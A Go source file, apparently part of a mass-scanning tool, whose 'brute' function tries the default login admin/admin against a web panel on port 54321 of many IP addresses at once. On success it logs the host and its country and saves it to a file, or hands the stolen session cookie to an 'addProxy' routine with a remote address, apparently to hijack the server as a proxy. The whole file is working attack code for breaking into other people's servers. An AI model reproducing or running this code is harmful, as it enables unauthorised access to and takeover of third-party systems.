package main

import (
	"encoding/json"
	"github.com/phuslu/iploc"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type xResponse struct {
	Success bool   `json:"success"`
	Msg     string `json:"msg"`
	Obj     string `json:"obj"`
}

func brute(ip string, semaphore chan struct{}, wg *sync.WaitGroup, of *os.File, remoteAddress string, remotePort string) {
	semaphore <- struct{}{}
	url := "http://" + ip + ":54321/login"
	client := http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("username=admin&password=admin"))
	if err != nil {
		<-semaphore
		wg.Done()
		return
	}
	input := new(xResponse)
	err = json.NewDecoder(resp.Body).Decode(input)
	if input.Success {
		cookies := resp.Cookies()
		var session http.Cookie
		for _, c := range cookies {
			if c.Name == "session" {
				session = *c
			}
		}
		if remoteAddress == "" {
			log.Println("[Success]", ip, string(iploc.Country(net.ParseIP(ip))))
			_, err := of.WriteString(ip + "\n")
			if err != nil {
				log.Panicln(err)
			}
		} else {
			addProxy(ip, &session, of, remoteAddress, remotePort)
		}
	}
	<-semaphore
	wg.Done()
	return
}
